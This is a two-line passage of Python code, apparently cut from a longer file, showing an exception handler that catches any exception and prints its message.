        except Exception as e:
            print(str(e))
